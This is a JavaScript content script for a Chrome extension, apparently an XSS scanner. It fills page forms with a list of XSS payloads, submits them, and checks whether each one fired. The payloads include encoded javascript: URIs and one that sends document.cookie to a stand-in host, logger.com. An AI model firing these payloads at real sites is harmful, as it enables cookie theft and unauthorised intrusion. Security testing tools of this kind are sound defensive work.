(function($) {

    function Scanner() {

    }

    function fillForm(formIndex, xssIndex) {
        var form = document.forms[formIndex];
        var inputs = form.getElementsByTagName('input');
        var inputs_size = inputs.length;
        for (var i = 0; i < inputs_size; i++) {
            var input = inputs.item(i);
            if (input.type === 'text') {
                input.value = xssArray[xssIndex].xssString;
            }
        }
        var hostname = location.hostname;
        if (hostname === 'localhost' || hostname === '127.0.0.1') {
            form.dispatchEvent(new Event('submit')); //для стенда
        } else {
            form.submit(); //в бою)
        }
    }

    function sendMessage(message) {
        port.postMessage(message);
    }

    function scanPage() {
        var forms = document.forms;
        var formsStrings = Array.prototype.map.call(forms, function(form) {
            return "id=" + form.id + ';name=' + form.name + ';classList=' +form.className;
        });
        sendMessage({
            sender: 'content-script',
            recipient: 'background',
            action: 'saveForms',
            data: {
                formsCount: document.forms.length,
                formsStrings: formsStrings,
                pageUrl: location.href
            }
        });
    }

    function checkVulnerability(xssIndex) {
        var status = !!eval(xssArray[xssIndex].result);
        console.log(status);
        if (xssIndex !== xssArray.length - 1) {
            sendMessage({
                sender: 'content-script',
                recipient: 'background',
                action: 'xssReport',
                data: {
                    report: {
                        xssString: xssArray[xssIndex].xssString,
                        vulnerable: status
                    }
                }
            });
        } else {
            sendMessage({
                sender: 'content-script',
                recipient: 'background',
                action: 'lastXssReport',
                data: {
                    report: {
                        xssString: xssArray[xssIndex].xssString,
                        vulnerable: status
                    }
                }
            });
        }

    }

    function messageHandler(message) {
        console.log(message);
        if (message.recipient === "content-script") {

            switch (message.action) {
                case 'scanPage':
                    scanPage();
                    break;

                case 'fillForm':
                    fillForm(message.data.formIndex, message.data.xssIndex);
                    break;

                case 'checkVulnerability':
                    checkVulnerability(message.data.xssIndex);
                    break;

                case 'refreshPage':
                    window.open(message.data.pageUrl, '_self');
                    break;
            }
        }

    }

    var chrRuntime = chrome.runtime;

    var scanner = new Scanner();
    var port = chrRuntime.connect();

    var xssArray = [
        {
            xssString: '<img src="empty.gif" onerror="location.hash=\'EVIL\';console.error(\'YOU ARE HACKED\');" />',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: 'ZZZ <script>location.hash=\'EVIL\';console.error(\'YOU ARE HACKED\');</script>',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: '<img src="empty.gif" onerror="var evilImg=new Image(); evilImg.src=\'http://logger.com/?c=\'+' +
            'encodeURI(document.cookie); document.body.appendChild(evilImg); evilImg.classList.add(\'evil-image\'); console.error(\'YOU ARE HACKED\',evilImg);" />',
            result: 'document.querySelector(".evil-image")'
        },
        {
            xssString: '<img src=javascript:void(location.hash=\'#EVIL\')>',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: '<img """><script>location.hash=\'EVIL\';</script>">',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: '<img src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x76;&#x6F;&#x69;&#x64;&#x28;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x61;&#x73;&#x68;&#x3D;&#x27;&#x23;&#x45;&#x56;&#x49;&#x4C;&#x27;&#x29;>',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: '<img src=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#118&#111&#105&#100&#40&#108&#111&#99&#97&#116&#105&#111&#110&#46&#104&#97&#115&#104&#61&#39&#35&#69&#86&#73&#76&#39&#41>',
            result: 'location.hash === "#EVIL"'
        },
        {
            xssString: '<img src=%6A%61%76%61%73%63%72%69%70%74%3A%76%6F%69%64%28%6C%6F%63%61%74%69%6F%6E%2E%68%61%73%68%3D%27%23%45%56%49%4C%27%29>',
            result: 'location.hash === "#EVIL"'
        },

    ];

    chrRuntime.onConnect.addListener(function (port) {
        port.onMessage.addListener(messageHandler);
    });

    sendMessage({
        sender: 'content-script',
        recipient: 'background',
        action: 'pageLoaded'
    });

})(Zepto);